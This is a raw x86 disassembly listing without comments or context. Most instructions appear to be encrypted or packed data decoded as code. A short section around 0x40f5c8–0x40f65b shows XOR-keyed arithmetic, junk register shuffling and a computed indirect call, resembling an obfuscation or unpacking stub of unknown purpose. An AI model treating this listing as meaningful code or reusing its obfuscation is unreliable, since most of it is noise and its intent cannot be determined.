  40f3ba:	fisub  DWORD PTR [esi-0x427b69a7]
  40f3c0:	and    al,BYTE PTR [ecx+0x47]
  40f3c3:	sub    eax,0x529faf7b
  40f3c8:	and    edx,DWORD PTR [esi+esi*4]
  40f3cb:	in     eax,0x4c
  40f3cd:	mov    ecx,0xbe2378e7
  40f3d2:	mov    ss,WORD PTR [eax+0x2e6d05df]
  40f3d8:	imul   edx,esp,0x6b
  40f3db:	repz ds jge 0x40f43e
  40f3df:	aaa    
  40f3e0:	pop    ds
  40f3e1:	retf   0xfcd1
  40f3e4:	dec    ebp
  40f3e5:	push   0xef54e050
  40f3ea:	push   edi
  40f3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ec:	mov    al,0xa3
  40f3ee:	lahf   
  40f3ef:	add    edi,DWORD PTR [edi-0x3f3eea37]
  40f3f5:	pop    edi
  40f3f6:	mov    dh,BYTE PTR [ebx+0x75164e5d]
  40f3fc:	jno    0x40f405
  40f3fe:	imul   ebp,DWORD PTR ds:0xfcb099d,0x5d
  40f405:	cmp    eax,0x5b5f04d9
  40f40a:	xor    eax,0xdda86357
  40f40f:	dec    esi
  40f410:	dec    eax
  40f411:	outs   dx,BYTE PTR ds:[esi]
  40f412:	outs   dx,BYTE PTR ds:[esi]
  40f413:	adc    ah,BYTE PTR [edx+0x4df98ad1]
  40f419:	nop
  40f41a:	jns    0x40f3b9
  40f41c:	adc    al,0x43
  40f41e:	push   ss
  40f41f:	retf   
  40f420:	sbb    BYTE PTR [edi+0x2a],bh
  40f423:	pop    edi
  40f424:	repnz or eax,0x2b6fabed
  40f42a:	call   0x38143a35
  40f42f:	je     0x40f409
  40f431:	mov    ds:0x5e683f2a,al
  40f436:	pop    ds
  40f437:	ss inc edx
  40f439:	ss lahf 
  40f43b:	cmp    eax,0xcb1c71d2
  40f440:	ds jmp 0x4787:0xfed34257
  40f448:	lods   eax,DWORD PTR ds:[esi]
  40f449:	les    esp,FWORD PTR [ebx]
  40f44b:	stc    
  40f44c:	mov    al,0xc9
  40f44e:	push   0x90e84d8c
  40f453:	jb     0x40f3eb
  40f455:	mov    esi,0x250b8029
  40f45a:	cdq    
  40f45b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f45c:	test   al,0x12
  40f45e:	bound  ebp,QWORD PTR [ebx+0x2d7024ec]
  40f464:	mov    al,0xcc
  40f466:	pop    ds
  40f467:	jecxz  0x40f47a
  40f469:	mov    ah,0x8c
  40f46b:	xor    DWORD PTR [edx+0x6346b7f5],edx
  40f471:	xchg   ebp,eax
  40f472:	mov    ebp,0x2e576b98
  40f477:	dec    ecx
  40f478:	lahf   
  40f479:	inc    edi
  40f47a:	fisub  DWORD PTR [esp+ebp*2-0x2ec5e63c]
  40f481:	out    0xb4,al
  40f483:	xchg   edi,eax
  40f484:	nop
  40f485:	jb     0x40f456
  40f487:	cmp    eax,0x6d2d037b
  40f48c:	retf   
  40f48d:	sar    BYTE PTR [ebx+0x7b],cl
  40f490:	cmp    al,0x8d
  40f492:	(bad)  
  40f493:	mov    bh,0xfa
  40f495:	cdq    
  40f496:	rol    DWORD PTR ds:0x1ab82e36,1
  40f49c:	aaa    
  40f49d:	outs   dx,DWORD PTR ds:[esi]
  40f49e:	jno    0x40f471
  40f4a0:	repz or al,0xdb
  40f4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a4:	loopne 0x40f466
  40f4a6:	push   esi
  40f4a7:	and    al,0xa9
  40f4a9:	and    eax,DWORD PTR [edx+eax*8+0x5bad2625]
  40f4b0:	push   0x5c7ee4d2
  40f4b5:	clc    
  40f4b6:	push   ebx
  40f4b7:	(bad)  
  40f4b8:	xchg   ebx,eax
  40f4b9:	xor    DWORD PTR [ebx+0x10090515],esp
  40f4bf:	fstp   DWORD PTR [edx+0x6de0ccfe]
  40f4c5:	ja     0x40f4cc
  40f4c7:	mov    cl,0x62
  40f4c9:	xor    al,0xac
  40f4cb:	dec    esp
  40f4cc:	imul   eax,DWORD PTR [ecx+0x235e3fa5],0x8b059624
  40f4d6:	adc    esi,DWORD PTR [ecx+0x7ffc25b2]
  40f4dc:	leave  
  40f4dd:	fnstsw ax
  40f4df:	sbb    eax,0x335e414d
  40f4e4:	xor    ecx,esi
  40f4e6:	gs or  eax,0x9bf15d47
  40f4ec:	repz rol BYTE PTR ds:0x335d2596,cl
  40f4f3:	stos   DWORD PTR es:[edi],eax
  40f4f4:	jns    0x40f4d7
  40f4f6:	stos   BYTE PTR es:[edi],al
  40f4f7:	jmp    0xdae4:0xe8cfc4c2
  40f4fe:	sbb    BYTE PTR [eax-0x1489b6e1],cl
  40f504:	fcmovnu st,st(5)
  40f506:	sahf   
  40f507:	gs jp  0x40f51b
  40f50a:	shr    DWORD PTR [ebx+0x30],cl
  40f50d:	dec    ebp
  40f50e:	xchg   esp,eax
  40f50f:	in     al,0x53
  40f511:	jle    0x40f56f
  40f513:	arpl   WORD PTR [edx],dx
  40f515:	adc    DWORD PTR [ecx+0xb3b0c1f],edi
  40f51b:	cmp    dh,BYTE PTR [eax-0x70979266]
  40f521:	inc    ebp
  40f522:	fidivr DWORD PTR [ecx-0x579b6380]
  40f528:	in     al,dx
  40f529:	dec    edi
  40f52a:	outs   dx,BYTE PTR ds:[esi]
  40f52b:	push   edi
  40f52c:	mov    dh,0x6
  40f52e:	aaa    
  40f52f:	mov    edx,0x21f14f2a
  40f534:	retf   0x397
  40f537:	data16 adc dl,BYTE PTR [edi+0xe]
  40f53b:	imul   BYTE PTR [esi]
  40f53d:	leave  
  40f53e:	xchg   ebx,ebx
  40f540:	jbe    0x40f55d
  40f542:	dec    esp
  40f543:	sti    
  40f544:	shl    bl,cl
  40f546:	sbb    al,0x92
  40f548:	sub    eax,0xf04b29fa
  40f54d:	es mov ebx,0xaa0e7eb3
  40f553:	sahf   
  40f554:	jp     0x40f529
  40f556:	xchg   esi,eax
  40f557:	mov    ebp,0x75f45c3f
  40f55c:	rol    BYTE PTR [eax+0x712316cb],cl
  40f562:	(bad)  
  40f563:	rcl    DWORD PTR fs:[ebp-0x6c],1
  40f567:	push   edx
  40f568:	mov    ebp,0xe6a09194
  40f56d:	cwde   
  40f56e:	into   
  40f56f:	ror    DWORD PTR [ecx-0x6e],0x68
  40f573:	jmp    0xbc7:0x99cc4be8
  40f57a:	jmp    0x87ae:0x89246213
  40f581:	add    eax,0x5c2d8df4
  40f586:	push   cs
  40f587:	je     0x40f510
  40f589:	mov    bl,0xd3
  40f58b:	jle    0x40f5de
  40f58d:	sub    DWORD PTR [edx-0x57],eax
  40f590:	dec    ecx
  40f591:	mov    al,0x7f
  40f593:	or     eax,0x2e96c3d6
  40f598:	lds    ebp,FWORD PTR [ecx+0x704b4e67]
  40f59e:	js     0x40f5da
  40f5a0:	mov    bl,0x60
  40f5a2:	lods   al,BYTE PTR ds:[esi]
  40f5a3:	daa    
  40f5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a5:	jno    0x40f535
  40f5a7:	adc    esi,ecx
  40f5a9:	push   cs
  40f5aa:	lock sub DWORD PTR [esi+0x323254d2],eax
  40f5b1:	mov    BYTE PTR [esi-0x6317f857],dh
  40f5b7:	mov    ch,0x64
  40f5b9:	ficomp DWORD PTR [edx]
  40f5bb:	imul   esp,ebx,0x5
  40f5be:	das    
  40f5bf:	stos   BYTE PTR es:[edi],al
  40f5c0:	stos   DWORD PTR es:[edi],eax
  40f5c1:	mov    ebx,0x7080853d
  40f5c6:	xor    ecx,esi
  40f5c8:	lea    eax,[ecx+eax*1+0x3272f1]
  40f5cf:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5d2:	mov    edx,DWORD PTR [ebp-0x20]
  40f5d5:	mov    DWORD PTR [edx+ecx*4],eax
  40f5d8:	mov    eax,DWORD PTR [ebp-0xc]
  40f5db:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5de:	xor    eax,esi
  40f5e0:	lea    eax,[eax+ecx*1+0x3272f1]
  40f5e7:	mov    DWORD PTR [ebp+0x8],eax
  40f5ea:	mov    eax,DWORD PTR [ebp-0xc]
  40f5ed:	mov    ecx,DWORD PTR [ebp+0x14]
  40f5f0:	xor    eax,esi
  40f5f2:	add    eax,edi
  40f5f4:	imul   eax,DWORD PTR [ecx]
  40f5f7:	mov    ecx,DWORD PTR [ebp-0x4]
  40f5fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f5fd:	xor    ecx,esi
  40f5ff:	lea    ecx,[ecx+edx*1+0x3272f1]
  40f606:	cmp    ecx,eax
  40f608:	jne    0x40d220
  40f60e:	mov    eax,DWORD PTR [ebp-0x4]
  40f611:	xor    eax,esi
  40f613:	add    eax,edi
  40f615:	mov    DWORD PTR [ebp-0x10],eax
  40f618:	mov    ebx,0x65655
  40f61d:	add    ebx,0x3234
  40f623:	xchg   ebx,esi
  40f625:	xor    ebx,ebx
  40f627:	push   esi
  40f628:	mov    esi,ebx
  40f62a:	pop    ebx
  40f62b:	mov    edx,esi
  40f62d:	add    ebx,0x1002
  40f633:	lea    eax,[ebp-0x18]
  40f636:	add    edx,eax
  40f638:	add    edx,0x5
  40f63b:	push   edx
  40f63c:	inc    esi
  40f63d:	pop    ecx
  40f63e:	dec    ecx
  40f63f:	xchg   ecx,eax
  40f640:	dec    eax
  40f641:	xchg   ecx,eax
  40f642:	dec    ecx
  40f643:	xchg   ecx,edx
  40f645:	dec    edx
  40f646:	push   edx
  40f647:	mov    edx,ebx
  40f649:	pop    ebx
  40f64a:	dec    ebx
  40f64b:	call   DWORD PTR [ebx]
  40f64d:	cmp    DWORD PTR [ebp+0x10],esi
  40f650:	je     0x413d8d
  40f656:	xchg   edx,eax
  40f657:	push   0xc
  40f659:	pop    ecx
  40f65a:	dec    ecx
  40f65b:	jmp    0x4119e9
  40f660:	test   al,0x3a
  40f662:	jl     0x40f606
  40f664:	out    dx,al
  40f665:	mov    ds:0xdb3d32a2,al
  40f66a:	sti    
  40f66b:	loopne 0x40f6a4
  40f66d:	retf   0xd470
  40f670:	jp     0x40f621
  40f672:	add    DWORD PTR [ebx-0x7c7ca1f4],0x42
  40f679:	hlt    
  40f67a:	mov    DWORD PTR [ecx],ebx
  40f67c:	cmc    
  40f67d:	pop    es
  40f67e:	xor    edx,0x6f
  40f681:	or     eax,DWORD PTR [edx]
  40f683:	mov    ds:0xc085741d,al
  40f688:	dec    esi
  40f689:	mov    al,0x3c
  40f68b:	mov    ebx,0x4efa5aa2
  40f690:	sub    eax,0x770c3eaa
  40f695:	test   al,0x95
  40f697:	ds sub eax,0x2996c8d5
  40f69d:	dec    edi
  40f69e:	jnp    0x40f68f
  40f6a0:	cmp    al,0xe6
  40f6a2:	pop    esp
  40f6a3:	cli    
  40f6a4:	ss sti 
  40f6a6:	sbb    esp,DWORD PTR [edx-0x73]
  40f6a9:	xchg   ebx,eax
  40f6aa:	mov    cl,0x54
  40f6ac:	hlt    
  40f6ad:	mov    al,ds:0x8a378707
  40f6b2:	pop    edx
  40f6b3:	es adc al,dh
  40f6b6:	pusha  
  40f6b7:	aam    0x9d
  40f6b9:	ret    0x877a
  40f6bc:	shl    esi,1
  40f6be:	fs mov ch,0x39
  40f6c1:	jno    0x40f73a
  40f6c3:	std    
  40f6c4:	or     BYTE PTR [eax+ebp*8],dl
  40f6c7:	push   ds
  40f6c8:	loop   0x40f6d4
  40f6ca:	mov    ah,0x59
  40f6cc:	out    0xf8,eax
  40f6ce:	push   ds
  40f6cf:	les    edx,FWORD PTR [edx+0x1d08a8fa]
  40f6d5:	sar    ah,0x1f
  40f6d8:	adc    al,0xdf
  40f6da:	mov    eax,ds:0x2a96a50c
  40f6df:	mov    ds:0x6e7acc92,al
  40f6e4:	outs   dx,DWORD PTR ds:[esi]
  40f6e6:	cmc    
  40f6e7:	pop    eax
  40f6e8:	(bad)  
  40f6e9:	sub    ebp,edx
  40f6eb:	icebp  
  40f6ec:	jge    0x40f67a
  40f6ee:	test   DWORD PTR [edx-0xf0ad65d],edi
  40f6f4:	fdiv   DWORD PTR [esi+0x6f8ec0e6]
  40f6fa:	inc    ebp
  40f6fb:	xchg   ebp,eax
  40f6fc:	int3   
  40f6fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6fe:	test   DWORD PTR [ebx],ebx
  40f700:	aas    
  40f701:	scas   al,BYTE PTR es:[edi]
  40f702:	int3   
  40f703:	inc    edx
  40f704:	scas   eax,DWORD PTR es:[edi]
  40f705:	mov    ebp,0x28ec0054
  40f70a:	in     eax,dx
  40f70b:	and    al,0xa8
  40f70d:	rol    BYTE PTR [esi+0x51],1
  40f710:	push   ebp
  40f711:	loope  0x40f6f6
  40f713:	mov    DWORD PTR [ebx+0x6f],ecx
  40f716:	(bad)
  40f71a:	xchg   ebp,eax
  40f71b:	push   ebp
  40f71c:	jnp    0x40f6db
  40f71e:	ss jb  0x40f6b8
  40f721:	out    dx,ax
  40f723:	ins    DWORD PTR es:[edi],dx
  40f724:	sbb    ah,BYTE PTR [ebx+0x12]
  40f727:	stc    
  40f728:	sub    DWORD PTR [ebx+edi*1],0x51
  40f72c:	and    eax,0xcafe2ce0
  40f731:	mov    bh,0xa7
  40f733:	mov    WORD PTR [ebx-0x1d],ds
  40f736:	mov    es,WORD PTR [ecx]
  40f738:	cmp    ebx,DWORD PTR [edx+0x4b929c94]
  40f73e:	daa    
  40f73f:	pop    esp
  40f740:	cli    
  40f741:	test   DWORD PTR [ecx+0x1bdd83a2],esp
  40f747:	int    0x4c
  40f749:	sbb    al,0xb0
  40f74b:	fimul  DWORD PTR [edx+ebx*8-0x7376a7f8]
  40f752:	cld    
  40f753:	dec    esi
  40f754:	rcl    BYTE PTR [eax+0x79b30462],cl
  40f75a:	jmp    0x40f789
  40f75c:	xor    dl,BYTE PTR [edx+edx*1]
  40f75f:	xchg   esi,eax
  40f760:	cmc    
  40f761:	stc    
  40f762:	retf   0x416f
  40f765:	mov    bh,0x3c
  40f767:	mov    ds:0x2704102d,al
  40f76c:	cwde   
  40f76d:	xchg   ecx,eax
  40f76e:	fdiv   QWORD PTR [edi+eax*2-0x59]
  40f772:	xor    al,0x91
  40f774:	aad    0xcf
  40f776:	and    al,0xa4
  40f778:	test   DWORD PTR [eax-0x72],0x1352bc3c
  40f77f:	inc    esi
  40f780:	daa    
  40f781:	fmul   DWORD PTR [ebp+0x45958125]
  40f787:	iret   
  40f788:	repz inc ebp
  40f78a:	xchg   DWORD PTR [ecx],esp
  40f78c:	enter  0xe91c,0x74
  40f790:	sub    eax,0x89672eac
  40f795:	lahf   
  40f796:	jne    0x40f7a6
  40f798:	jmp    DWORD PTR [ebx+0x70bb5bf7]
  40f79e:	xor    eax,0xd8379983
  40f7a3:	ds in  al,0x8f
  40f7a6:	pop    ebx
  40f7a7:	sub    BYTE PTR [ecx+0x6],0x2d
  40f7ab:	dec    esp
  40f7ac:	out    0x4f,al
  40f7ae:	cwde   
  40f7af:	push   ebx
  40f7b0:	push   es
  40f7b1:	fistp  QWORD PTR [bx+di-0x70ff]
  40f7b6:	retf   
  40f7b7:	xchg   DWORD PTR [edi+edx*8+0x2b7b9ce9],edi
  40f7be:	inc    edi
  40f7bf:	aam    0xe0
  40f7c1:	enter  0x7b66,0xa8
  40f7c5:	or     al,0x8c
  40f7c7:	jb     0x40f783
  40f7c9:	sar    DWORD PTR [edx-0x3527dfe7],1
  40f7cf:	xor    BYTE PTR [edx],al
  40f7d1:	xchg   ebx,eax
  40f7d2:	(bad)  
  40f7d3:	mov    esp,0x6a8c6a64
  40f7d8:	xchg   DWORD PTR [ebx],ebp
  40f7da:	neg    BYTE PTR [ebx]
  40f7dc:	and    DWORD PTR [edx+0x1b],ebp
  40f7df:	sub    al,0xa6
  40f7e1:	adc    edi,esi
  40f7e3:	push   0x72cfa982
  40f7e8:	pop    edx
  40f7e9:	fdivr  st,st(2)
  40f7eb:	into   
  40f7ec:	dec    ebp
  40f7ed:	add    eax,0x91ca32e2
  40f7f2:	mov    esi,0xf03e47a4
  40f7f7:	or     al,0xef
  40f7f9:	aad    0x4d
  40f7fb:	dec    ecx
  40f7fc:	lds    esp,FWORD PTR ds:0x2db1125b
  40f802:	jno    0x40f859
  40f804:	or     esp,DWORD PTR [ebp-0xf979c0d]
  40f80a:	xchg   ebp,eax
  40f80b:	(bad)  
  40f80c:	in     eax,0xb7
  40f80e:	pop    edx
  40f80f:	leave  
  40f810:	push   edi
  40f811:	sub    BYTE PTR [ebx+ebp*4],bh
  40f814:	sub    ah,0x46
  40f817:	adc    eax,0x4318c42d
  40f81c:	popf   
  40f81d:	add    DWORD PTR [ebx+ebp*8+0x4ed43bbc],ecx
  40f824:	mov    ebx,0x8df45e1d
  40f829:	ds lds edi,FWORD PTR es:[edi]
  40f82d:	jo     0x40f89f
  40f82f:	xchg   esi,eax
  40f830:	mov    bh,0xa8
  40f832:	gs add dh,ch
  40f835:	repnz cmp ah,BYTE PTR [edi+eiz*1]
  40f839:	pop    es
  40f83a:	pop    ebx
  40f83b:	test   eax,0x6189a8ad
  40f840:	(bad)  
  40f842:	mov    esi,0x89ea9ee5
  40f847:	(bad)  
  40f84a:	ss push edi
  40f84c:	and    dl,bl
  40f84e:	mov    eax,0xfabcdc20
  40f853:	jg     0x40f7d6
  40f855:	int    0x20
  40f857:	retf   0xddc9
  40f85a:	mov    ds:0xb2274a54,al
  40f85f:	fist   WORD PTR [edx+edi*8-0x11]
  40f863:	nop
  40f864:	xlat   BYTE PTR ds:[ebx]
  40f865:	(bad)  
  40f866:	(bad)  
  40f867:	(bad)  
  40f869:	mov    DWORD PTR ds:[ecx+0x1d],0x5053d452
  40f871:	iret   
  40f872:	mov    edi,0x2fd507de
  40f877:	push   0xffffffbe
  40f879:	or     eax,0xa3ea00d6
  40f87e:	jnp    0x40f896
  40f880:	sub    edx,DWORD PTR [ebp+0x7b]
  40f883:	sbb    cl,BYTE PTR [eax+ebp*1-0x10fad4cc]
  40f88a:	imul   edx,DWORD PTR [ecx+edx*8-0x6d66f713],0x6b4c0797
  40f895:	mov    ebx,0x6c960dc1
  40f89a:	xor    eax,ecx
  40f89c:	ja     0x40f840
  40f89e:	add    al,0xa2
  40f8a0:	dec    edi
  40f8a1:	dec    edx
  40f8a2:	push   esp
  40f8a3:	fwait
  40f8a4:	jg     0x40f8ab
  40f8a6:	retf   
  40f8a7:	xchg   esi,eax
  40f8a8:	jo     0x40f8ed
  40f8aa:	mov    eax,ds:0xf137eaa3
  40f8af:	leave  
  40f8b0:	or     al,BYTE PTR [ebx+0x1bd9dc9c]
  40f8b6:	sbb    BYTE PTR [ecx+ebp*8+0x60],dl
  40f8ba:	xor    al,0x13
  40f8bc:	pushf  
  40f8bd:	or     al,0xc1
  40f8bf:	lods   al,BYTE PTR ds:[esi]
  40f8c0:	cmp    dh,BYTE PTR ds:0xb131b77f
  40f8c6:	test   eax,0xe9490008
  40f8cb:	or     al,BYTE PTR [ebp+0x49]
  40f8ce:	push   esi
  40f8cf:	push   ebx
  40f8d0:	out    dx,eax
  40f8d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d2:	les    esp,FWORD PTR [eax]
  40f8d4:	jp     0x40f93f
  40f8d6:	ins    BYTE PTR es:[edi],dx
  40f8d7:	icebp  
  40f8d8:	imul   esi,DWORD PTR [edi-0x6c],0xffffffb9
  40f8dc:	sti    
  40f8dd:	hlt    
  40f8de:	adc    edi,ebp
  40f8e0:	imul   esp,DWORD PTR [eax+ebx*4-0x76],0xffffffb5
  40f8e5:	and    al,0xe7
  40f8e7:	and    ebx,DWORD PTR [ebx+0x24]
  40f8ea:	fs mov cl,0x6e
  40f8ed:	jmp    0x9af66426
  40f8f2:	gs dec ecx
  40f8f4:	fwait
  40f8f5:	loopne 0x40f93e
  40f8f7:	push   ds
  40f8f8:	mov    bl,0xee
  40f8fa:	and    cl,BYTE PTR [ecx]
  40f8fc:	mov    dl,0x53
  40f8fe:	sti    
  40f8ff:	enter  0xb25f,0x85
  40f903:	icebp  
  40f904:	or     BYTE PTR [eax-0x2ab1df10],bl
  40f90a:	jno    0x40f931
  40f90c:	test   eax,edi
  40f90e:	mov    ds:0xfa45df26,al
  40f913:	and    BYTE PTR [ebx-0x30d0c99d],ch
  40f919:	mov    DWORD PTR [edx-0x5fa5cba5],ebx
  40f91f:	ficom  DWORD PTR [eax]
  40f921:	xchg   ecx,eax
  40f922:	mov    ah,0x53
  40f924:	repnz lods al,BYTE PTR ds:[esi]
  40f926:	ret    
  40f927:	test   DWORD PTR [esi+0x13],ebp
  40f92a:	mul    edx
  40f92c:	add    edx,ebp
  40f92e:	pop    ecx
  40f92f:	jns    0x40f99c
  40f931:	xchg   bh,bh
  40f933:	repnz loope 0x40f981
  40f936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f937:	fdecstp 
  40f939:	popf   
  40f93a:	or     DWORD PTR [ebp-0x71],ebp
  40f93d:	jg     0x40f907
  40f93f:	push   ecx
  40f940:	jp     0x40f907
  40f942:	xchg   al,dl
  40f944:	dec    edi
  40f945:	popa   
  40f946:	ins    BYTE PTR es:[edi],dx
  40f947:	and    BYTE PTR [ecx+0x27],cl
  40f94a:	mov    edi,0xc19799e1
  40f94f:	xchg   BYTE PTR [eax+edi*4-0x4ed26e16],al
  40f956:	sub    al,0xd8
  40f958:	mov    cl,0x43
  40f95a:	das    
  40f95b:	int    0x3e
  40f95d:	js     0x40f99a
  40f95f:	in     al,dx
  40f960:	mov    ch,0x64
  40f962:	mov    dh,0x52
  40f964:	inc    edi
  40f965:	push   eax
  40f966:	retf   0xd00a
  40f969:	dec    esi
  40f96a:	push   es
  40f96b:	ficom  DWORD PTR [ebx-0x5374095d]
  40f971:	xor    cl,BYTE PTR [eax+0x7c3590b5]
  40f977:	sti    
  40f978:	dec    ecx
  40f979:	imul   edi,DWORD PTR [esp+ebp*4],0xed4774e6
  40f980:	repnz rcr DWORD PTR [ebp-0x7b],1
  40f984:	test   eax,0x28037ed5
  40f989:	scas   al,BYTE PTR es:[edi]
  40f98a:	sub    ch,BYTE PTR [eax+0x7e]
  40f98d:	push   edi
  40f98e:	ret    0x90f5
  40f991:	(bad)  
  40f993:	mov    edx,0xef5b2278
  40f998:	out    0x6,al
  40f99a:	retf   0x6f5a
  40f99d:	sub    DWORD PTR [ecx+0x8],edx
  40f9a0:	sbb    cl,cl
  40f9a2:	(bad)  
  40f9a3:	(bad)  
  40f9a4:	mov    ebp,0xe4e7de26
  40f9a9:	aaa    
  40f9aa:	jmp    0x40f95f
  40f9ac:	sbb    dl,BYTE PTR [eax+eiz*8-0x45]
  40f9b0:	mov    ebp,0x3ae62575
  40f9b5:	mov    edx,0xcd8fa946
  40f9ba:	loopne 0x40f972
  40f9bc:	mov    bh,0x70
  40f9be:	rol    BYTE PTR [eax+0x39d99a1e],1
  40f9c4:	inc    ebp
  40f9c5:	pop    esi
  40f9c6:	mov    esi,DWORD PTR [eax+0x5352f92]
  40f9cc:	mov    edx,0xcc59d9e1
  40f9d1:	retf   
  40f9d2:	push   edx
  40f9d3:	inc    ebp
  40f9d4:	mov    ebp,0x7ea94bc9
  40f9d9:	clc    
  40f9da:	inc    ebp
  40f9db:	mov    edi,0x2b847d7a
  40f9e0:	xor    DWORD PTR [edx],ebx
  40f9e2:	xor    DWORD PTR [eax],ebp
  40f9e4:	pop    ss
  40f9e5:	jns    0x40fa12
  40f9e7:	nop
  40f9e8:	out    dx,al
  40f9e9:	xor    DWORD PTR [eax+0xe],edx
  40f9ec:	hlt    
  40f9ed:	es dec esi
  40f9ef:	xchg   BYTE PTR [edx+0x27f3c9bc],ah
  40f9f5:	jge    0x40f986
  40f9f7:	retf   
  40f9f8:	xor    BYTE PTR [edx],al
  40f9fa:	int    0xb6
  40f9fc:	mov    dl,BYTE PTR [esi-0x3a0a98be]
  40fa02:	push   ecx
  40fa03:	xchg   BYTE PTR [esi],dh
  40fa05:	jns    0x40fa7b
  40fa07:	inc    ecx
  40fa08:	mov    edi,0xf869ffb0
  40fa0d:	sbb    BYTE PTR [eax],al
  40fa0f:	mov    eax,ds:0x29d19db5
  40fa14:	and    al,0x49
  40fa16:	ja     0x40fa75
  40fa18:	cmp    al,0x33
  40fa1a:	xor    BYTE PTR [eax+0x54],al
  40fa1d:	rcr    DWORD PTR [edi+0x5c],0x49
  40fa21:	ins    BYTE PTR es:[edi],dx
  40fa22:	shl    edx,1
  40fa24:	scas   al,BYTE PTR es:[edi]
  40fa25:	mov    edx,0x45ca7b66
  40fa2a:	mov    BYTE PTR [esi-0x17],ah
  40fa2d:	xchg   edi,eax
  40fa2e:	cmp    BYTE PTR [eax-0x60],dh
  40fa31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa32:	or     DWORD PTR [edx],0x5a24e3b1
  40fa38:	mov    ds:0x7cabb20c,eax
  40fa3d:	cmp    DWORD PTR [esi],eax
  40fa3f:	into   
  40fa40:	push   esp
  40fa41:	adc    al,0x22
  40fa43:	ins    DWORD PTR es:[edi],dx
  40fa44:	retf   0xeced
  40fa47:	(bad)  
  40fa49:	dec    ebp
  40fa4a:	out    0xbd,eax
  40fa4c:	fmulp  st(2),st
  40fa4e:	pop    esi
  40fa4f:	jmp    0xd416:0xf8575f2f
  40fa56:	pop    es
  40fa57:	(bad)  
  40fa59:	mov    ecx,0x439c47cb
  40fa5e:	imul   ebx,DWORD PTR [esi-0x61a07cd9],0x47fc44fb
  40fa68:	dec    esi
  40fa69:	lods   al,BYTE PTR ds:[esi]
  40fa6a:	pop    ds
  40fa6b:	push   esp
  40fa6c:	popf   
  40fa6d:	shl    DWORD PTR [eax+0x55450cbb],cl
  40fa73:	das    
  40fa74:	inc    edi
  40fa75:	pushf  
  40fa76:	aas    
  40fa77:	cmp    DWORD PTR [edi-0x1e],edx
  40fa7a:	mov    bl,0x43
  40fa7c:	mov    ebx,0x5cc5527a
  40fa81:	cmc    
  40fa82:	in     eax,dx
  40fa83:	aaa    
  40fa84:	jp     0x40fa90
  40fa86:	xor    edx,edx
  40fa88:	add    al,0xed
  40fa8a:	adc    ax,0x2433
  40fa8e:	daa    
  40fa8f:	loop   0x40fa82
  40fa91:	test   BYTE PTR [edi],0xd9
  40fa94:	imul   esp,DWORD PTR [eax-0x74],0x46f9e262
  40fa9b:	nop
  40fa9c:	out    dx,al
  40fa9d:	or     ch,BYTE PTR [ebx-0x56]
  40faa0:	mov    al,0x95
  40faa2:	popf   
  40faa3:	adc    DWORD PTR [eax],eax
  40faa5:	outs   dx,BYTE PTR ds:[esi]
  40faa6:	bound  edx,QWORD PTR [ecx]
  40faa8:	mov    ah,0xa6
  40faaa:	cld    
  40faab:	cmp    BYTE PTR [eax],ah
  40faad:	mov    ah,0xba
  40faaf:	(bad)  
  40fab0:	mov    esi,0x709489df
  40fab5:	xchg   ebp,eax
  40fab6:	mov    BYTE PTR [ecx],cl
  40fab8:	out    0xcf,eax
  40faba:	aaa    
  40fabb:	sbb    eax,DWORD PTR [edx-0x404ffa1b]
  40fac1:	mov    BYTE PTR [ebx-0x52597467],dh
  40fac7:	add    edx,eax
  40fac9:	jmp    0x9dd98b8a
  40face:	xor    dl,al
  40fad0:	aas    
  40fad1:	or     BYTE PTR [ebp+0x53],bh
  40fad4:	sub    eax,0x3ffb5a2f
  40fad9:	inc    esp
  40fada:	loop   0x40faab
  40fadc:	imul   edx,DWORD PTR [eax],0xef43cf34
  40fae2:	fcmovb st,st(2)
  40fae4:	(bad)  
  40fae5:	mov    esp,0xb9cc4fe6
  40faea:	rol    DWORD PTR [edi+0x75a62400],0x50
  40faf1:	(bad)  
  40faf2:	pop    ebp
  40faf3:	sbb    ecx,DWORD PTR [esi]
  40faf5:	jp     0x40fb0c
  40faf7:	push   eax
  40faf8:	gs ret 0xc888
  40fafc:	inc    edi
  40fafd:	stc    
  40fafe:	or     BYTE PTR [ebx],bl
  40fb00:	addr16 dec edi
  40fb02:	shl    BYTE PTR [edi+0x18],0x3
  40fb06:	(bad)  
  40fb07:	xor    eax,0xff8dd511
  40fb0c:	sbb    al,BYTE PTR [ebp-0x4672e89c]
  40fb12:	sub    al,0xa4
  40fb14:	sti    
  40fb15:	sbb    ebp,esp
  40fb17:	inc    ebx
  40fb18:	mov    bh,BYTE PTR [esi]
  40fb1a:	push   esi
  40fb1b:	jmp    0x40fb27
  40fb1d:	xchg   ebx,eax
  40fb1e:	dec    esp
  40fb1f:	loope  0x40fb49
  40fb21:	int    0x6d
  40fb23:	mov    cl,0x9e
  40fb25:	dec    esi
  40fb26:	test   al,0x34
  40fb28:	les    ebp,FWORD PTR [ebp-0x1552091b]
  40fb2e:	and    BYTE PTR [edi+0xf],cl
  40fb31:	in     eax,0x12
  40fb33:	mov    ecx,0x23939246
  40fb38:	shr    dl,1
  40fb3a:	jno    0x40faec
  40fb3c:	mov    ds:0x32622576,eax
  40fb41:	aad    0x9a
  40fb43:	(bad)  
  40fb44:	fidiv  WORD PTR ds:0xa5330012
  40fb4a:	ins    DWORD PTR es:[edi],dx
  40fb4b:	loop   0x40fb56
  40fb4d:	push   ds
  40fb4e:	je     0x40fb71
  40fb50:	xor    ebp,DWORD PTR [ebx+eiz*8-0x14]
  40fb54:	mov    edi,0x297a81a8
  40fb59:	lods   eax,DWORD PTR ds:[esi]
  40fb5a:	lods   al,BYTE PTR ds:[esi]
  40fb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb5c:	aaa    
  40fb5d:	add    eax,0xdeb66550
  40fb62:	push   edi
  40fb63:	mov    edi,0xbc09cbf
  40fb68:	mov    ah,0xaa
  40fb6a:	add    BYTE PTR [esi],bh
